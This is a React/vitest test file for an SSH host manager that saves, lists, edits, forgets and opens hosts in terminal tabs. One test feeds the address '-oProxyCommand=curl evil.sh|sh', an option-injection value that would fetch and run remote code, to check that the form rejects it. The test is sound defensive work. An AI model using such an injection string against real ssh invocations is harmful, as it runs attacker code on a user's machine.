import { render, screen, waitFor } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { beforeEach, describe, expect, it, vi } from "vitest";
import { Remote } from "./Remote";
import { getPlatform } from "../../platform";
import { useTabs } from "../../app/tabStore";

async function clean() {
  const remote = getPlatform().remote;
  for (const host of await remote.list()) await remote.forget(host.id);
}

async function addHost(address: string, label = "") {
  return getPlatform().remote.save({
    id: `h-${address}`,
    label,
    address,
    user: "",
    port: null,
    identity_file: null,
    jump: null,
    last_used: 0,
  });
}

const fill = async (user: ReturnType<typeof userEvent.setup>, field: string, value: string) => {
  await user.clear(screen.getByLabelText(field));
  await user.type(screen.getByLabelText(field), value);
};

describe("the remote section", () => {
  beforeEach(async () => {
    await clean();
    useTabs.setState({ tabs: [], activeId: null });
  });

  it("says plainly that it stores no credential", () => {
    // The design, not an omission: connecting runs the ssh already here.
    render(<Remote />);
    expect(screen.getByText(/No password or key is stored here/)).toBeInTheDocument();
    expect(screen.queryByLabelText(/password/i)).toBeNull();
  });

  it("lists saved hosts with where they point", async () => {
    await getPlatform().remote.save({
      id: "h1",
      label: "production",
      address: "example.com",
      user: "deploy",
      port: 2222,
      identity_file: null,
      jump: "bastion.example.com",
      last_used: 0,
    });
    render(<Remote />);

    expect(await screen.findByText("production")).toBeInTheDocument();
    expect(screen.getByText("deploy@example.com:2222 via bastion.example.com")).toBeInTheDocument();
  });

  it("falls back to the address when nobody named it", async () => {
    await addHost("db-01.internal");
    render(<Remote />);
    // Twice: as the name it does not have, and as where it points.
    expect(await screen.findAllByText("db-01.internal")).toHaveLength(2);
  });

  it("saves a new host", async () => {
    const user = userEvent.setup();
    render(<Remote />);

    await user.click(screen.getByRole("button", { name: "+ Add host" }));
    await fill(user, "Name", "staging");
    await fill(user, "Address", "staging.example.com");
    await user.click(screen.getByRole("button", { name: "Save" }));

    expect(await screen.findByText("staging")).toBeInTheDocument();
  });

  it("refuses a host that ssh would read as an option, and says why", async () => {
    // `-oProxyCommand=…` is the documented way to turn "connect to this host"
    // into "run this on my laptop".
    const user = userEvent.setup();
    render(<Remote />);

    await user.click(screen.getByRole("button", { name: "+ Add host" }));
    await fill(user, "Address", "-oProxyCommand=curl evil.sh|sh");
    await user.click(screen.getByRole("button", { name: "Save" }));

    expect(await screen.findByRole("alert")).toHaveTextContent(/option/);
    expect(screen.queryByText("-oProxyCommand=curl evil.sh|sh")).toBeNull();
  });

  it("opens a terminal tab pointed at the host", async () => {
    // A tab of its own, so a failure to connect is shown in ssh's own words
    // where every other command's output is.
    await addHost("example.com", "production");
    const user = userEvent.setup();
    render(<Remote />);

    await user.click(await screen.findByRole("button", { name: /Open a terminal on production/ }));

    const tabs = useTabs.getState().tabs;
    expect(tabs).toHaveLength(1);
    expect(tabs[0].title).toBe("production");
    expect(tabs[0].remotes[tabs[0].id]).toBe("h-example.com");
  });

  it("forgets a host", async () => {
    await addHost("example.com", "production");
    const user = userEvent.setup();
    render(<Remote />);

    await user.click(await screen.findByRole("button", { name: "Forget production" }));
    await waitFor(() => expect(screen.queryByText("production")).toBeNull());
  });

  it("edits a host without losing where it points", async () => {
    await addHost("example.com", "old name");
    const user = userEvent.setup();
    render(<Remote />);

    await user.click(await screen.findByRole("button", { name: "Edit" }));
    await fill(user, "Name", "new name");
    await user.click(screen.getByRole("button", { name: "Save" }));

    expect(await screen.findByText("new name")).toBeInTheDocument();
    expect(screen.getByText("example.com")).toBeInTheDocument();
  });

  it("says so when the hosts cannot be read rather than looking empty", async () => {
    vi.spyOn(getPlatform().remote, "list").mockRejectedValueOnce(new Error("disk on fire"));
    render(<Remote />);
    expect(await screen.findByRole("alert")).toHaveTextContent("disk on fire");
  });

  it("leaves the port empty rather than assuming 22", async () => {
    // Empty means "whatever ssh would use" — a Port in ~/.ssh/config should
    // still win.
    const user = userEvent.setup();
    render(<Remote />);
    await user.click(screen.getByRole("button", { name: "+ Add host" }));
    expect(screen.getByLabelText("Port")).toHaveValue(null);
  });
});
